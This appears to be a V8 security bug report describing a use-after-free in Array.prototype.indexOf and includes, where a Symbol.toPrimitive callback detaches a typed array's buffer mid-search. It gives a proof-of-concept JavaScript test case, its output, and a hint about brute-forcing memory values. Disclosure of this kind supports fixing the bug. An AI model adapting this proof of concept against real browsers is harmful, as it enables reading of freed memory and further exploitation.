<b>VULNERABILITY DETAILS</b>

This vulnerability occurs in the following two functions:
- Array.prototype.indexOf(arr, elem, from_index);
- Array.prototype.includes(arr, elem, from_index);

I'll describe only indexOf since two vulnerabilities occurs in the similar process.

Summary: In the process of Array.indexOf, properties of arr can be changed.

In runtime-array.cc,

1. it checks the length of the target array first (https://chromium.googlesource.com/v8/v8/+/5.6.326.50/src/runtime/runtime-array.cc#574).
2. from_index is converted to integer by calling Object::ToInteger (https://chromium.googlesource.com/v8/v8/+/5.6.326.50/src/runtime/runtime-array.cc#586).
3. Iterate elements using the length calculated in 1.

In the step 2, the length of the target array can be changed (or any properties can be changed). If we pass a typed array to the `arr`, and if we neuter arr.buffer in the step 2. Then, step 3 search in freed elements.

<b>VERSION</b>
v8 5.6.326.50 32bit version
I tested it in Ubuntu 14.04.3 64bit, and compiled v8 to ia32.release.

<b>REPRODUCTION CASE</b>

For simplicity, I used ArrayBufferNeuter native function.

================ test.js ==================
// flags: --allow-natives-syntax
var buf = new ArrayBuffer(0x10000);
var arr2 = new Uint8Array(buf).fill(55);
var tmp = {};
tmp[Symbol.toPrimitive] = function () {
  %ArrayBufferNeuter(arr2.buffer)
  var arr3 = new Uint8Array(0x800).fill(0xfc);
  return 0;
};

print(Array.prototype.indexOf.call(arr2, 0x00, tmp));
==========================================

$ ./out/ia32.release/d8 --allow-natives-syntax ./test_arrindex.js
10

Since we filled the typedarray to 55, it has to print -1. But, in my machine, it prints 10 as an output. It searched freed elements, and found the position of null! If we use Uint8Array for brute-force, we can easily guess values in memories. 